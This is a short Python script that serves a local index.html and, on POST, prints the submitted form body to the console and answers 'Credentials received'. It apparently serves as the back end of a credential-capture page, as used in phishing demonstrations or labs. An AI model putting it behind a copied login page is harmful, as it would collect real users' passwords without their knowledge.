from http.server import BaseHTTPRequestHandler, HTTPServer

file = open("./index.html", "r")
page = file.read()
file.close()


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

        self.wfile.write(bytes(page, "utf8"))

    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        
        # this is because BaseHTTPRequestHandler will process the first line and the headers of the http request then leave the rest up to you
        content_length = int(self.headers['Content-Length'])
        file_content = self.rfile.read(content_length)
        print(file_content)

        message = "Credentials received"
        self.wfile.write(bytes(page + message, "utf8"))

with HTTPServer(('', 8000), handler) as server:
    server.serve_forever()